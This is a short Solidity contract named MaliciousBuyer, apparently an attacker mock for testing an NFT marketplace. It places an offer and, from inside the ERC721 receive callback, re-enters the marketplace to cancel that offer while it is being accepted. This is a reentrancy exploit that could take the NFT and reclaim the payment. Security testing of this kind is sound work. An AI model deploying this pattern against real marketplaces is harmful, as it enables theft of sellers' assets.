// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./NFTMarketplace.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract MaliciousBuyer is IERC721Receiver {
    NFTMarketplace public marketplace;
    address public nftContract;

    constructor(address _marketplace, address _nftContract) {
        marketplace = NFTMarketplace(_marketplace);
        nftContract = _nftContract;
    }

    function createOffer(uint256 tokenId) external payable {
        marketplace.createOffer{value: msg.value}(nftContract, tokenId);
    }

    function onERC721Received(
        address,
        address,
        uint256 tokenId,
        bytes calldata
    ) external override returns (bytes4) {
        // Re-enter to cancel the offer while it's being accepted!
        marketplace.cancelOffer(nftContract, tokenId);
        return this.onERC721Received.selector;
    }

    receive() external payable {}
}
